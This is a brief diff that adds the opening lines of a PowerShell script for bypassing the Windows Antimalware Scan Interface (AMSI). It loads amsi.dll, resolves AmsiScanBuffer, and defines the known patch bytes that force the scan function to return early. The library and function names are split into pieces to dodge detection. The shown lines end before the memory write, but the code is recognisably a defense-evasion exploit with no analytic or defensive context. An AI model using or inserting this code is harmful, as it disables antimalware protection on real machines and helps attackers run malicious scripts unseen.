@@ -1,0 +1,5 @@
+$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
+$var = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
+$p = 0
+
